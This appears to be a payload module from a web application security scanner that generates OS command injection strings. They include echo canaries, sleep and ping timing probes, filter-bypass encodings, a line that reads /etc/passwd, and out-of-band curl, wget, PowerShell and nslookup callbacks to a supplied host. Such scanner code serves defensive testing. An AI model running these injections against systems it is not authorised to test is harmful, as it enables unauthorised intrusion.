"""
DevSecure360 — DAST CMDi Payloads (Enterprise Edition)
========================================================
Command Injection payload set — Unix and Windows, in-band echo, time-based blind, OOB.
Sources: OWASP Testing Guide WSTG-INPV-12, PayloadsAllTheThings CMDi corpus,
PortSwigger OS command injection cheat sheet.
"""


def get_payloads(canary_id: str) -> list:
    """
    Echo-based in-band payloads. Confirmed when canary_id appears in the response body.
    Uses multiple separators for maximum coverage across shell environments.
    """
    return [
        # ── Unix command separators ────────────────────────────────────────────
        f"; echo {canary_id}",
        f"| echo {canary_id}",
        f"& echo {canary_id}",
        f"`echo {canary_id}`",
        f"$(echo {canary_id})",
        f"\n echo {canary_id}",
        f"|| echo {canary_id}",
        f"&& echo {canary_id}",
        f"\r\n echo {canary_id}",

        # ── Unix with full path (bypass PATH restrictions) ────────────────────
        f"; /bin/echo {canary_id}",
        f"; /usr/bin/printf {canary_id}",

        # ── Windows command separators ────────────────────────────────────────
        f"& echo {canary_id}",
        f"| echo {canary_id}",
        f"&& echo {canary_id}",
        f"|| echo {canary_id}",

        # ── Windows with full path ────────────────────────────────────────────
        f"& cmd /c echo {canary_id}",
        f"| cmd /c echo {canary_id}",

        # ── Backtick substitution (shell interpolation) ───────────────────────
        f"test`echo {canary_id}`test",
        f"test$(echo {canary_id})test",

        # ── URL encoded separators (filter bypass) ────────────────────────────
        f"%3B echo {canary_id}",       # ; URL encoded
        f"%7C echo {canary_id}",       # | URL encoded
        f"%26 echo {canary_id}",       # & URL encoded

        # ── Double-encoded ────────────────────────────────────────────────────
        f"%253B echo {canary_id}",     # ; double-encoded

        # ── Newline injection (for server-side template / config injection) ────
        f"\n echo {canary_id}\n",

        # ── Alternative output methods ─────────────────────────────────────────
        f"; cat /etc/passwd | grep {canary_id[:4]}",  # tests /etc/passwd read
    ]


def get_blind_time_payloads() -> list:
    """
    Time-based blind CMDi payloads. Confirmed by response time > 4.5s.
    No output in response body — detect via timing only.
    """
    return [
        # Unix sleep
        "; sleep 5",
        "| sleep 5",
        "& sleep 5",
        "`sleep 5`",
        "$(sleep 5)",
        "; /bin/sleep 5",
        "|| sleep 5",
        "&& sleep 5",

        # Unix ping (reliable on systems without sleep)
        "& ping -c 5 127.0.0.1",
        "; ping -c 5 127.0.0.1",

        # Windows
        "& ping -n 5 127.0.0.1",
        "| ping -n 5 127.0.0.1",
        "& timeout /t 5",

        # URL-encoded variants
        "%3B sleep 5",
        "%7C sleep 5",
    ]


def get_oob_payloads(oob_url: str, canary_id: str) -> list:
    """OOB payloads that trigger DNS/HTTP callbacks to confirm blind CMDi."""
    return [
        # HTTP-based OOB (most reliable with curl/wget)
        f"; curl -s http://{oob_url}/{canary_id}",
        f"; wget -q -O /dev/null http://{oob_url}/{canary_id}",
        f"| curl -s http://{oob_url}/{canary_id}",
        f"; /usr/bin/curl -s http://{oob_url}/{canary_id}",
        f"& curl -s http://{oob_url}/{canary_id}",

        # PowerShell (Windows)
        f"& powershell -c \"Invoke-WebRequest http://{oob_url}/{canary_id}\"",
        f"| powershell iwr http://{oob_url}/{canary_id}",

        # Python-based (for Python servers)
        f"; python -c \"import urllib.request; urllib.request.urlopen('http://{oob_url}/{canary_id}')\"",
        f"; python3 -c \"import urllib.request; urllib.request.urlopen('http://{oob_url}/{canary_id}')\"",

        # Perl
        f"; perl -e \"use LWP::Simple; get('http://{oob_url}/{canary_id}')\"",

        # DNS-based (via nslookup/dig — works even with egress HTTP blocked)
        f"; nslookup {canary_id}.{oob_url}",
        f"| nslookup {canary_id}.{oob_url}",
    ]
